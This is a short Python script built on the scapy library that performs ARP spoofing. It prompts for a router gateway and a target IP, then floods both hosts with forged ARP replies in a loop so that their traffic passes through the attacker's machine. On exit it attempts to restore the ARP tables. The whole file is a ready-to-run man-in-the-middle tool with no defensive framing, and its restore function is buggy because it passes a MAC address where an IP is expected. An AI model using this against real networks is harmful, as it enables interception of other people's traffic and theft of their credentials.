import time
import scapy.all as scapy

def mac_arp(ip):
    arp_request = scapy.ARP(pdst=(ip))
    mac_request = scapy.Ether()
    mac_request.dst="ff:ff:ff:ff:ff:ff"
    arp_mac_request=mac_request/arp_request
    linked_list = scapy.srp(arp_mac_request, timeout=1,verbose=False)[0]
    return linked_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = mac_arp(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac , psrc=spoof_ip)
    scapy.send(packet,verbose=False)
def restore(linked_ip,unlinked_ip):
    linked_mac = mac_arp(linked_ip)
    unlinked_ip = mac_arp(unlinked_ip)
    packet = scapy.ARP(op=2 , pdst=linked_ip , hwdst=linked_mac , psrc=unlinked_ip , hwsrc=unlinked_ip)
    scapy.send(packet, count=4 , verbose=False)


spoof_ip = input("[+] Enter the router gateway address: ")
target_ip =input("[+] Enter the target ip address: ")

packet_count = 0
try:
   while True:
      spoof(spoof_ip,target_ip)
      spoof(target_ip,spoof_ip)
      packet_count = packet_count + 2
      print("\r\033[92m[-] Packet has been sent:",str(packet_count),end="")
      time.sleep(2)

except KeyboardInterrupt:
        print("\033[93m\n[Q] Packet Flow Quitting........ ")
        restore(spoof_ip,target_ip)
        restore(target_ip,spoof_ip)




